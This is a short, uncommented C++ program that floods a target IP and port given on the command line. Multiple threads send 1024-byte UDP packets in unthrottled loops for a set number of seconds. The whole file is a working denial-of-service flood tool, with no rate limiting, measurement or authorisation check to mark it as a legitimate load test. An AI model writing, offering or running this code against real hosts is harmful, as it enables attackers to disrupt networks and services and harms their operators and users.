#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <atomic>
#include <thread>
#include <vector>
#include <string>
#include <chrono>
#include <cstdlib>

static std::atomic<bool> g_running{false};

static void udp_thread(const std::string& ip, int port) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return;
    sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port   = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);
    std::vector<char> payload(1024, 'A');
    while (g_running.load()) {
        sendto(s, payload.data(), payload.size(), 0, (sockaddr*)&target, sizeof(target));
    }
    close(s);
}

int main(int argc, char** argv) {
    if (argc < 5) return 1;
    std::string ip = argv[1];
    int port = atoi(argv[2]);
    int thr  = atoi(argv[3]);
    int dur  = atoi(argv[4]);
    g_running = true;
    std::vector<std::thread> pool;
    for (int i = 0; i < thr; i++) pool.emplace_back(udp_thread, ip, port);
    std::thread timer([dur]() {
        std::this_thread::sleep_for(std::chrono::seconds(dur));
        g_running = false;
    });
    for (auto& t : pool)  if (t.joinable()) t.join();
    if (timer.joinable()) timer.join();
    return 0;
}
